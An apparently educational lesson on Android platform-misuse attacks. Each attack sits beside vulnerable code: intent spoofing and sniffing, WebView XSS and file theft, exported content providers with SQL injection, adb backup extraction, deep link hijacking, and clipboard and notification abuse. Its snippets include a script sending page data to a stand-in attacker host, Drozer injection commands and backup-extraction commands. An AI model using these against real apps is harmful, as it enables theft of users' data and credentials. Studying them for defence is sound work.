# Module 09: Improper Platform Usage - Attacks

## Overview

This lesson covers specific attacks that exploit improper platform usage. Each attack shows how misusing Android APIs leads to security vulnerabilities.

## Attack 1: Intent-Based Attacks

Intents are messages that Android components use to communicate. Improper use of intents leads to several attack types.

### Attack 1a: Intent Spoofing

An attacker sends fake intents to exported components.

**Vulnerable code:**
```xml
<activity android:name=".ResetPasswordActivity"
          android:exported="true" />
```

**Attack:**
```java
// Malicious app creates this intent
Intent intent = new Intent();
intent.setComponent(new ComponentName(
    "com.targetapp",
    "com.targetapp.ResetPasswordActivity"
));
intent.putExtra("email", "victim@example.com");
startActivity(intent);
```

**Result:**
The attacker triggers a password reset for the victim's account.

### Attack 1b: Intent Sniffing

Implicit intents can be intercepted by malicious apps.

**Vulnerable code:**
```java
Intent intent = new Intent("com.example.SEND_DATA");
intent.putExtra("token", sessionToken);
sendBroadcast(intent);
```

**Attack:**
A malicious app registers a receiver for the same action and intercepts the data.

**Result:**
The session token is stolen by the malicious app.

## Attack 2: WebView-Based Attacks

WebView is used to display web content. Misconfiguration leads to serious attacks.

### Attack 2a: Cross-Site Scripting (XSS) via WebView

**Vulnerable code:**
```java
webView.setJavaScriptEnabled(true);
webView.setAllowFileAccess(true);
webView.loadData(userInput, "text/html", "UTF-8");
```

**Attack:**
The attacker injects JavaScript via user input:
```html
<script>
  var content = document.body.innerText;
  new XMLHttpRequest().open('GET', 'http://attacker.com/steal?data=' + content);
</script>
```

**Result:**
The JavaScript executes in the WebView context and sends app data to the attacker.

### Attack 2b: File Theft via WebView

**Vulnerable code:**
```java
webView.setAllowFileAccess(true);
webView.setAllowFileAccessFromFileURLs(true);
webView.loadUrl("file:///android_asset/page.html");
```

**Attack:**
If the HTML page contains JavaScript, it can read local files:
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///data/data/com.targetapp/databases/secret.db');
xhr.send();
```

**Result:**
The JavaScript reads the app's database and can send it to the attacker.

## Attack 3: Content Provider Attacks

### Attack 3a: Data Theft via Exported Provider

**Vulnerable manifest:**
```xml
<provider android:name=".UserProvider"
          android:authorities="com.targetapp.users"
          android:exported="true" />
```

**Attack using Drozer:**
```
dz> run app.provider.query content://com.targetapp.users
```

**Result:**
All user data (passwords, emails) is exposed.

### Attack 3b: SQL Injection via Provider

**Vulnerable code:**
```java
public Cursor query(Uri uri, String[] projection,
                    String selection, String[] selectionArgs,
                    String sortOrder) {
    String query = "SELECT * FROM users WHERE id = " + selection;
    return database.rawQuery(query, null);
}
```

**Attack using Drozer:**
```
dz> run app.provider.query content://com.targetapp.users
    --selection "1 OR 1=1"
```

**Result:**
Returns all users because the SQL injection works.

## Attack 4: Backup-Based Attacks

### Attack 4a: Data Extraction via ADB Backup

**Vulnerable manifest:**
```xml
<application android:allowBackup="true" ...>
```

**Attack:**
```
adb backup -f backup.ab com.targetapp
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar -xvf backup.tar
```

**Result:**
All app data (databases, shared preferences, files) is extracted.

## Attack 5: Deep Link Attacks

Deep links allow apps to open specific content via URLs.

### Attack: Deep Link Hijacking

**Vulnerable manifest:**
```xml
<activity android:name=".PaymentActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="payment" />
    </intent-filter>
</activity>
```

**Attack:**
A malicious app registers the same deep link scheme. When the user clicks a payment link, the malicious app opens instead of the real app.

**Result:**
The malicious app can steal payment information.

## Attack 6: Clipboard Attacks

### Attack: Copying Sensitive Data to Clipboard

**Vulnerable code:**
```java
ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
ClipData clip = ClipData.newPlainText("password", userPassword);
clipboard.setPrimaryClip(clip);
```

**Attack:**
A malicious app monitors the clipboard for changes:
```java
clipboard.addPrimaryClipChangedListener(listener);
```

**Result:**
The password is stolen from the clipboard.

## Attack 7: Notification Listener Abuse

### Attack: Reading Notifications

**Vulnerable code:**
Some apps post sensitive information in notifications.

**Attack:**
A malicious app with `BIND_NOTIFICATION_LISTENER_SERVICE` permission reads all notifications.

**Result:**
OTP codes, messages, and other sensitive data are stolen from notifications.

## Real-World Examples

| Attack | Real Case |
|--------|-----------|
| WebView XSS | Facebook app vulnerability allowed injecting JavaScript |
| Intent Spoofing | Google Pay exported activity allowed payment manipulation |
| Backup Attack | Many apps leak data via ADB backup |
| Deep Link Hijacking | Uber deep link was hijackable |
| Clipboard Attack | Password managers exposing passwords via clipboard |

## Summary

Improper platform usage enables many attacks: intent spoofing and sniffing, WebView XSS and file theft, content provider data leakage, backup extraction, deep link hijacking, clipboard theft, and notification abuse. Each attack exploits developers misusing Android APIs and features.